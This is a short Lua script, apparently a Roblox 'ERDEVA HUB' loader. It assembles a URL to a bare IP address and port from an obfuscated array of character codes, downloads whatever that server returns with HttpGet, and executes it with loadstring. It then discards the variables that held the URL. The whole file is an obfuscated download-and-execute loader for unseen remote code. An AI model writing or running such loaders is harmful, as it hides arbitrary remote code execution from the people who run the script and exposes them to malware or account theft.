local _c = string.char
local _b = {104,116,116,112,58,47,47,55,56,46,49,53,52,46,49,48,51,46,52,50,58,57,50,57,54,47,103,101,116,115,99,114,105,112,116,63,116,111,107,101,110,61,69,82,68,69,86,65,95,57,56,51,50,55,52,57,56,49,50,55,51,57,49,56,50,55,51}

local _u = ""
for i = 1, #_b do
    _u = _u .. _c(_b[i])
end
table.clear(_b)
_b = nil

local res = game:HttpGet(_u)
_u = nil

if res and #res > 50 then
    loadstring(res)()
else
    warn("[ERDEVA HUB] Failed")
end
